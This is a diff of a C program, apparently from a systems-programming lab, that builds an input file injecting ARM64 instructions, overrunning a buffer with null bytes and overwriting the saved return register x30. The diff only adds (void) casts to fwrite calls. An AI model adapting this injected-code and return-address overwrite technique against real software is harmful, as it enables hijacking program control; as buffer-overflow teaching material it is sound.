@@ -41,27 +41,27 @@ int main(void) {
 
     /* adr x0, 0x42006A */
     uiInstr = MiniAssembler_adr(0, 0x42006A, 0x42006C);
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* bl printf */
     uiInstr = MiniAssembler_bl(0x400690, 0x420070);
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* mov x0, 'A' */
     uiInstr = MiniAssembler_mov(0, '+');
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* adr x1, 0x420044 */
     uiInstr = MiniAssembler_adr(1, 0x420044,0x420078);
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* strb x0, [x1] */
     uiInstr = MiniAssembler_strb(0, 1);
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* b 0x40089c */
     uiInstr = MiniAssembler_b(0x40089c, 0x420080);
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* Add nullbytes to overrun the buffer */
     for (i = 0; i < 4; i++) {
@@ -69,7 +69,7 @@ int main(void) {
     }
 
     /* Overwrite x30 with address of printf call in main */
-    fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);
 
     /* Close the file */
     fclose(psFile);
